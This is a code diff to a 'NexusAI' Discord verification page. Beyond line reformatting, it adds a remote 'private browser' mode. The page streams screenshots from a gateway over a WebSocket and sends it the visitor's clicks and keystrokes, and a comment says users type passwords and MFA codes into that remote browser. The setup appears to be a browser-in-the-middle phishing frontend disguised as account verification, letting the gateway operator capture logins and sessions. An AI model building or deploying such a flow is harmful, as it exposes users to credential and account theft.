-            !Boolean(turnstileToken) ||
+            !Boolean(
+              turnstileToken
+            ) ||
             isStartingVerification;
         }
       };
 
     window.turnstileFailed =
       function() {
-        turnstileToken = null;
+
+        turnstileToken =
+          null;
 
         const button =
-          byId("continue-step-1");
+          byId(
+            "continue-step-1"
+          );
 
         if (button) {
-          button.disabled = true;
+          button.disabled =
+            true;
         }
       };
 
     window.turnstileExpired =
       function() {
-        turnstileToken = null;
+
+        turnstileToken =
+          null;
 
         const button =
-          byId("continue-step-1");
+          byId(
+            "continue-step-1"
+          );
 
         if (button) {
-          button.disabled = true;
+          button.disabled =
+            true;
         }
       };
 
@@ -1621,7 +2307,8 @@
           `${CONFIG.API_BASE}${endpoint}`,
           {
             method:
-              options.method || "GET",
+              options.method ||
+              "GET",
 
             headers:
               options.body
@@ -1643,13 +2330,15 @@
           }
         );
 
-      let data = null;
+      let data =
+        null;
 
       try {
         data =
           await response.json();
       } catch {
-        data = null;
+        data =
+          null;
       }
 
       if (!response.ok) {
@@ -1667,6 +2356,7 @@
        ===================================================== */
 
     async function startVerification() {
+
       if (
         !turnstileToken ||
         isStartingVerification
@@ -1674,10 +2364,13 @@
         return;
       }
 
-      isStartingVerification = true;
+      isStartingVerification =
+        true;
 
       const button =
-        byId("continue-step-1");
+        byId(
+          "continue-step-1"
+        );
 
       setLoading(
         button,
@@ -1686,11 +2379,13 @@
       );
 
       try {
+
         const result =
           await apiRequest(
             "/api/verification/start",
             {
-              method: "POST",
+              method:
+                "POST",
 
               body: {
                 turnstileToken
@@ -1728,16 +2423,20 @@
         if (answer) {
           answer.value = "";
 
-          setTimeout(() => {
-            answer.focus();
-          }, 100);
+          setTimeout(
+            () =>
+              answer.focus(),
+            100
+          );
         }
 
-        turnstileToken = null;
+        turnstileToken =
+          null;
 
         showStep(2);
 
       } catch (error) {
+
         console.error(
           "[NexusAI] Step 1 failed:",
           error
@@ -1749,7 +2448,9 @@
         );
 
       } finally {
-        isStartingVerification = false;
+
+        isStartingVerification =
+          false;
 
         setLoading(
           button,
@@ -1759,10 +2460,14 @@
         if (
           byId("step-1")
             ?.classList
-            .contains("active")
+            .contains(
+              "active"
+            )
         ) {
           button.disabled =
-            !Boolean(turnstileToken);
+            !Boolean(
+              turnstileToken
+            );
         }
       }
     }
@@ -1772,24 +2477,36 @@
        ===================================================== */
 
     async function submitChallenge() {
-      if (isSubmittingChallenge) {
+
+      if (
+        isSubmittingChallenge
+      ) {
         return;
       }
 
       const answerInput =
-        byId("challenge-answer");
+        byId(
+          "challenge-answer"
+        );
 
       const button =
-        byId("challenge-submit");
+        byId(
+          "challenge-submit"
+        );
 
       const errorElement =
-        byId("challenge-error");
+        byId(
+          "challenge-error"
+        );
 
       const answer =
-        answerInput?.value?.trim() ||
+        answerInput
+          ?.value
+          ?.trim() ||
         "";
 
       if (!answer) {
+
         if (errorElement) {
           errorElement.textContent =
             "Please enter your answer.";
@@ -1800,7 +2517,10 @@
         return;
       }
 
-      if (!verificationToken) {
+      if (
+        !verificationToken
+      ) {
+
         showFatalError(
           "Your verification session has expired. Please restart verification."
         );
@@ -1808,10 +2528,12 @@
         return;
       }
 
-      isSubmittingChallenge = true;
+      isSubmittingChallenge =
+        true;
 
       if (errorElement) {
-        errorElement.textContent = "";
+        errorElement.textContent =
+          "";
       }
 
       setLoading(
@@ -1821,11 +2543,13 @@
       );
 
       try {
+
         const result =
           await apiRequest(
             "/api/verification/challenge",
             {
-              method: "POST",
+              method:
+                "POST",
 
               body: {
                 verificationToken,
@@ -1844,6 +2568,7 @@
         showStep(3);
 
       } catch (error) {
+
         console.error(
           "[NexusAI] Step 2 failed:",
           error
@@ -1856,7 +2581,9 @@
         }
 
       } finally {
-        isSubmittingChallenge = false;
+
+        isSubmittingChallenge =
+          false;
 
         setLoading(
           button,
@@ -1870,11 +2597,17 @@
        ===================================================== */
 
     function connectDiscord() {
-      if (isConnectingDiscord) {
+
+      if (
+        isConnectingDiscord
+      ) {
         return;
       }
 
-      if (!verificationToken) {
+      if (
+        !verificationToken
+      ) {
+
         showFatalError(
           "Your verification session has expired. Please restart verification."
         );
@@ -1882,13 +2615,13 @@
         return;
       }
 
-      isConnectingDiscord = true;
+      isConnectingDiscord =
+        true;
 
       const button =
-        byId("discord-login");
-
-      const status =
-        byId("discord-status");
+        byId(
+          "discord-login"
+        );
 
       setStatus(
         "Opening Discord...",
@@ -1896,7 +2629,9 @@
       );
 
       if (button) {
-        button.disabled = true;
+
+        button.disabled =
+          true;
 
         button.innerHTML = `
           <span class="button-spinner"></span>
@@ -1919,6 +2654,7 @@
        ===================================================== */
 
     function processVerificationResult() {
+
       const params =
         new URLSearchParams(
           window.location.search
@@ -1932,6 +2668,7 @@
       if (
         result === "success"
       ) {
+
         showSuccess();
 
         window.history.replaceState(
@@ -1946,8 +2683,11 @@
       if (
         result === "error"
       ) {
+
         showFatalError(
-          params.get("message") ||
+          params.get(
+            "message"
+          ) ||
           "Discord verification failed."
         );
 
@@ -1968,9 +2708,960 @@
        ===================================================== */
 
     function retryVerification() {
+
       window.location.replace(
         window.location.pathname
       );
+    }
+
+    /* =====================================================
+       BROWSER TOKEN
+       ===================================================== */
+
+    function getBrowserTokenFromPath() {
+
+      const pathname =
+        window.location.pathname;
+
+      const match =
+        pathname.match(
+          /^\/login\/([^/]+)\/?$/
+        );
+
+      if (!match) {
+        return null;
+      }
+
+      return (
+        decodeURIComponent(
+          match[1]
+        ) ||
+        null
+      );
+    }
+
+    /* =====================================================
+       BROWSER MODE
+       ===================================================== */
+
+    function enterBrowserMode(
+      token
+    ) {
+
+      if (!token) {
+        return;
+      }
+
+      browserMode =
+        true;
+
+      browserToken =
+        token;
+
+      document.body.classList.add(
+        "browser-mode"
+      );
+
+      updateBrowserStatus(
+        "Connecting",
+        false
+      );
+
+      showBrowserLoading(
+        true,
+        "Connecting to your private browser..."
+      );
+
+      connectBrowserSocket();
+    }
+
+    /* =====================================================
+       BROWSER STATUS
+       ===================================================== */
+
+    function updateBrowserStatus(
+      text,
+      connected
+    ) {
+
+      const statusText =
+        byId(
+          "browser-status-text"
+        );
+
+      const statusDot =
+        document.querySelector(
+          ".browser-status-dot"
+        );
+
+      if (statusText) {
+        statusText.textContent =
+          text;
+      }
+
+      if (statusDot) {
+
+        if (connected) {
+          statusDot.style.background =
+            "var(--success)";
+        } else {
+          statusDot.style.background =
+            "var(--danger)";
+        }
+      }
+    }
+
+    function showBrowserLoading(
+      visible,
+      text = ""
+    ) {
+
+      const loading =
+        byId(
+          "browser-loading"
+        );
+
+      const loadingText =
+        byId(
+          "browser-loading-text"
+        );
+
+      if (loadingText && text) {
+        loadingText.textContent =
+          text;
+      }
+
+      if (!loading) {
+        return;
+      }
+
+      loading.classList.toggle(
+        "hidden",
+        !visible
+      );
+    }
+
+    function showBrowserBanner(
+      message
+    ) {
+
+      const banner =
+        byId(
+          "browser-banner"
+        );
+
+      if (!banner) {
+        return;
+      }
+
+      banner.textContent =
+        message || "";
+
+      banner.classList.toggle(
+        "visible",
+        Boolean(message)
+      );
+    }
+
+    /* =====================================================
+       BROWSER SOCKET
+       ===================================================== */
+
+    function connectBrowserSocket() {
+
+      if (
+        !browserToken
+      ) {
+        browserConnectionFailed(
+          "Browser session token is missing."
+        );
+
+        return;
+      }
+
+      if (
+        !CONFIG.BROWSER_GATEWAY_URL ||
+        CONFIG.BROWSER_GATEWAY_URL.includes(
+          "YOUR-PUBLIC-BROWSER-GATEWAY"
+        )
+      ) {
+
+        browserConnectionFailed(
+          "The browser gateway URL has not been configured."
+        );
+
+        return;
+      }
+
+      try {
+
+        const separator =
+          CONFIG.BROWSER_GATEWAY_URL.includes(
+            "?"
+          )
+            ? "&"
+            : "?";
+
+        const websocketUrl =
+          `${CONFIG.BROWSER_GATEWAY_URL}${separator}token=${encodeURIComponent(
+            browserToken
+          )}`;
+
+        browserSocket =
+          new WebSocket(
+            websocketUrl
+          );
+
+      } catch (error) {
+
+        console.error(
+          "[NexusAI] Browser websocket creation failed:",
+          error
+        );
+
+        browserConnectionFailed(
+          "Could not create the browser connection."
+        );
+
+        return;
+      }
+
+      browserSocket.addEventListener(
+        "open",
+        () => {
+
+          browserConnected =
+            true;
+
+          updateBrowserStatus(
+            "Connected",
+            true
+          );
+
+          showBrowserLoading(
+            false
+          );
+
+          /*
+           * Ask gateway for current state.
+           */
+          sendBrowserCommand(
+            {
+              type:
+                "state"
+            }
+          );
+
+          /*
+           * Ask immediately for a screenshot.
+           */
+          sendBrowserCommand(
+            {
+              type:
+                "screenshot"
+            }
+          );
+
+        }
+      );
+
+      browserSocket.addEventListener(
+        "message",
+        event => {
+          handleBrowserMessage(
+            event.data
+          );
+        }
+      );
+
+      browserSocket.addEventListener(
+        "close",
+        event => {
+
+          browserConnected =
+            false;
+
+          updateBrowserStatus(
+            "Disconnected",
+            false
+          );
+
+          showBrowserLoading(
+            true,
+            event?.reason ||
+              "Browser connection closed."
+          );
+
+        }
+      );
+
+      browserSocket.addEventListener(
+        "error",
+        error => {
+
+          console.error(
+            "[NexusAI] Browser websocket error:",
+            error
+          );
+
+          browserConnected =
+            false;
+
+          updateBrowserStatus(
+            "Connection error",
+            false
+          );
+        }
+      );
+    }
+
+    function browserConnectionFailed(
+      message
+    ) {
+
+      browserConnected =
+        false;
+
+      updateBrowserStatus(
+        "Unavailable",
+        false
+      );
+
+      showBrowserLoading(
+        true,
+        message
+      );
+
+      showBrowserBanner(
+        message
+      );
+    }
+
+    /* =====================================================
+       BROWSER MESSAGE HANDLER
+       ===================================================== */
+
+    function handleBrowserMessage(
+      rawData
+    ) {
+
+      let message;
+
+      try {
+        message =
+          JSON.parse(
+            String(
+              rawData
+            )
+          );
+      } catch {
+        return;
+      }
+
+      if (!message) {
+        return;
+      }
+
+      switch (
+        message.type
+      ) {
+
+        case "connected":
+
+          browserConnected =
+            true;
+
+          updateBrowserStatus(
+            "Connected",
+            true
+          );
+
+          showBrowserLoading(
+            false
+          );
+
+          break;
+
+        case "state":
+
+          updateBrowserUrl(
+            message.url
+          );
+
+          break;
+
+        case "screenshot":
+
+          updateBrowserScreenshot(
+            message
+          );
+
+          updateBrowserUrl(
+            message.url
+          );
+
+          break;
+
+        case "error":
+
+          showBrowserBanner(
+            message.error ||
+              "Browser command failed."
+          );
+
+          break;
+
+        case "pong":
+
+          break;
+
+        default:
+
+          break;
+      }
+    }
+
+    /* =====================================================
+       SEND COMMAND
+       ===================================================== */
+
+    function sendBrowserCommand(
+      payload
+    ) {
+
+      if (
+        !browserSocket ||
+        browserSocket.readyState !==
+          WebSocket.OPEN
+      ) {
+        return false;
+      }
+
+      try {
+
+        browserSocket.send(
+          JSON.stringify(
+            payload
+          )
+        );
+
+        return true;
+
+      } catch (error) {
+
+        console.error(
+          "[NexusAI] Browser command send failed:",
+          error
+        );
+
+        return false;
+      }
+    }
+
+    /* =====================================================
+       SCREENSHOT
+       ===================================================== */
+
+    function updateBrowserScreenshot(
+      message
+    ) {
+
+      const image =
+        byId(
+          "browser-screenshot"
+        );
+
+      if (
+        !image ||
+        !message?.data
+      ) {
+        return;
+      }
+
+      image.src =
+        `data:image/${message.format || "jpeg"};base64,${message.data}`;
+
+      image.onload =
+        () => {
+          showBrowserLoading(
+            false
+          );
+        };
+    }
+
+    /* =====================================================
+       URL
+       ===================================================== */
+
+    function updateBrowserUrl(
+      url
+    ) {
+
+      const element =
+        byId(
+          "browser-url"
+        );
+
+      if (!element) {
+        return;
+      }
+
+      element.textContent =
+        url ||
+        "Browser";
+    }
+
+    /* =====================================================
+       VIEWPORT COORDINATES
+       ===================================================== */
+
+    function browserCoordinates(
+      event
+    ) {
+
+      const image =
+        byId(
+          "browser-screenshot"
+        );
+
+      if (
+        !image
+      ) {
+        return null;
+      }
+
+      const rect =
+        image.getBoundingClientRect();
+
+      if (
+        rect.width <= 0 ||
+        rect.height <= 0
+      ) {
+        return null;
+      }
+
+      const naturalWidth =
+        image.naturalWidth ||
+        rect.width;
+
+      const naturalHeight =
+        image.naturalHeight ||
+        rect.height;
+
+      let x =
+        (event.clientX - rect.left) *
+        (naturalWidth / rect.width);
+
+      let y =
+        (event.clientY - rect.top) *
+        (naturalHeight / rect.height);
+
+      x =
+        Math.max(
+          0,
+          Math.min(
+            naturalWidth,
+            x
+          )
+        );
+
+      y =
+        Math.max(
+          0,
+          Math.min(
+            naturalHeight,
+            y
+          )
+        );
+
+      return {
+        x,
+        y
+      };
+    }
+
+    /* =====================================================
+       POINTER EVENTS
+       ===================================================== */
+
+    function setupBrowserPointerEvents() {
+
+      const canvas =
+        byId(
+          "browser-canvas"
+        );
+
+      if (!canvas) {
+        return;
+      }
+
+      canvas.addEventListener(
+        "mousedown",
+        event => {
+
+          const coordinates =
+            browserCoordinates(
+              event
+            );
+
+          if (!coordinates) {
+            return;
+          }
+
+          browserPointerDown =
+            true;
+
+          sendBrowserCommand(
+            {
+              type:
+                "click",
+
+              x:
+                coordinates.x,
+
+              y:
+                coordinates.y,
+
+              button:
+                event.button === 2
+                  ? "right"
+                  : event.button === 1
+                    ? "middle"
+                    : "left",
+
+              clickCount:
+                event.detail || 1
+            }
+          );
+
+          event.preventDefault();
+
+          canvas.focus();
+        }
+      );
+
+      canvas.addEventListener(
+        "mouseup",
+        () => {
+          browserPointerDown =
+            false;
+        }
+      );
+
+      canvas.addEventListener(
+        "dblclick",
+        event => {
+
+          const coordinates =
+            browserCoordinates(
+              event
+            );
+
+          if (!coordinates) {
+            return;
+          }
+
+          sendBrowserCommand(
+            {
+              type:
+                "doubleClick",
+
+              x:
+                coordinates.x,
+
+              y:
+                coordinates.y
+            }
+          );
+
+          event.preventDefault();
+        }
+      );
+
+      canvas.addEventListener(
+        "mousemove",
+        event => {
+
+          if (
+            !browserPointerDown
+          ) {
+            return;
+          }
+
+          const now =
+            Date.now();
+
+          if (
+            now -
+              lastMouseMoveAt <
+            CONFIG.MOUSE_MOVE_THROTTLE_MS
+          ) {
+            return;
+          }
+
+          lastMouseMoveAt =
+            now;
+
+          const coordinates =
+            browserCoordinates(
+              event
+            );
+
+          if (!coordinates) {
+            return;
+          }
+
+          sendBrowserCommand(
+            {
+              type:
+                "mouseMove",
+
+              x:
+                coordinates.x,
+
+              y:
+                coordinates.y
+            }
+          );
+        }
+      );
+
+      canvas.addEventListener(
+        "wheel",
+        event => {
+
+          sendBrowserCommand(
+            {
+              type:
+                "wheel",
+
+              deltaX:
+                event.deltaX,
+
+              deltaY:
+                event.deltaY
+            }
+          );
+
+          event.preventDefault();
+        },
+        {
+          passive:
+            false
+        }
+      );
+
+      canvas.addEventListener(
+        "contextmenu",
+        event => {
+          event.preventDefault();
+        }
+      );
+    }
+
+    /* =====================================================
+       KEYBOARD
+       ===================================================== */
+
+    function setupBrowserKeyboardEvents() {
+
+      const canvas =
+        byId(
+          "browser-canvas"
+        );
+
+      if (!canvas) {
+        return;
+      }
+
+      canvas.addEventListener(
+        "keydown",
+        event => {
+
+          sendBrowserCommand(
+            {
+              type:
+                "keyDown",
+
+              key:
+                event.key
+            }
+          );
+
+          event.preventDefault();
+        }
+      );
+
+      canvas.addEventListener(
+        "keyup",
+        event => {
+
+          sendBrowserCommand(
+            {
+              type:
+                "keyUp",
+
+              key:
+                event.key
+            }
+          );
+
+          event.preventDefault();
+        }
+      );
+
+      /*
+       * Text input support.
+       *
+       * We intentionally use key presses for normal keyboard
+       * interaction. Passwords and MFA codes remain entered
+       * directly by the user into the remote browser.
+       */
+    }
+
+    /* =====================================================
+       NAVIGATION
+       ===================================================== */
+
+    function browserBack() {
+      sendBrowserCommand(
+        {
+          type:
+            "back"
+        }
+      );
+    }
+
+    function browserForward() {
+      sendBrowserCommand(
+        {
+          type:
+            "forward"
+        }
+      );
+    }
+
+    function browserReload() {
+      sendBrowserCommand(
+        {
+          type:
+            "reload"
+        }
+      );
+    }
+
+    /* =====================================================
+       CLOSE BROWSER
+       ===================================================== */
+
+    async function closeBrowserSession() {
+
+      if (
+        !browserToken
+      ) {
+        return;
+      }
+
+      try {
+
+        await apiRequest(
+          `/session/${encodeURIComponent(
+            browserToken
+          )}/close`,
+          {
+            method:
+              "POST"
+          }
+        );
+
+      } catch (error) {
+
+        console.error(
+          "[NexusAI] Browser session close failed:",
+          error
+        );
+
+      }
+
+      try {
+
+        browserSocket?.close(
+          1000,
+          "Browser closed by user."
+        );
+
+      } catch {
+        // Ignore.
+      }
+
+      browserConnected =
+        false;
+
+      showBrowserLoading(
+        true,
+        "Browser session closed."
+      );
+
+      updateBrowserStatus(
+        "Closed",
+        false
+      );
+
+      showBrowserBanner(
+        "Your private browser session has been closed."
+      );
+    }
+
+    /* =====================================================
+       RETURN FROM BROWSER MODE
+       ===================================================== */
+
+    function returnToNormalPage() {
+
+      try {
+        browserSocket?.close(
+          1000,
+          "Leaving browser page."
+        );
+      } catch {
+        // Ignore.
+      }
+
+      browserSocket =
+        null;
+
+      browserToken =
+        null;
+
+      browserConnected =
+        false;
+
+      browserMode =
+        false;
+
+      document.body.classList.remove(
+        "browser-mode"
+      );
+    }
+
+    /* =====================================================
+       BROWSER PAGE INITIALIZATION
+       ===================================================== */
+
+    function initialiseBrowserPage() {
+
+      const token =
+        getBrowserTokenFromPath();
+
+      if (!token) {
+        return false;
+      }
+
+      enterBrowserMode(
+        token
+      );
+
+      return true;
     }
 
     /* =====================================================
@@ -1996,8 +3687,10 @@
     )?.addEventListener(
       "keydown",
       event => {
+
         if (
-          event.key === "Enter"
+          event.key ===
+          "Enter"
         ) {
           event.preventDefault();
 
@@ -2020,19 +3713,58 @@
       retryVerification
     );
 
+    byId(
+      "browser-back"
+    )?.addEventListener(
+      "click",
+      browserBack
+    );
+
+    byId(
+      "browser-forward"
+    )?.addEventListener(
+      "click",
+      browserForward
+    );
+
+    byId(
+      "browser-reload"
+    )?.addEventListener(
+      "click",
+      browserReload
+    );
+
+    byId(
+      "browser-close"
+    )?.addEventListener(
+      "click",
+      closeBrowserSession
+    );
+
+    setupBrowserPointerEvents();
+    setupBrowserKeyboardEvents();
+
     /* =====================================================
        INITIALIZATION
        ===================================================== */
 
-    const returnedFromVerification =
-      processVerificationResult();
+    const browserPageActive =
+      initialiseBrowserPage();
 
     if (
-      !returnedFromVerification
+      !browserPageActive
     ) {
-      console.log(
-        "[NexusAI] Verification frontend loaded."
-      );
+
+      const returnedFromVerification =
+        processVerificationResult();
+
+      if (
+        !returnedFromVerification
+      ) {
+        console.log(
+          "[NexusAI] Verification frontend loaded."
+        );
+      }
     }
   </script>
 
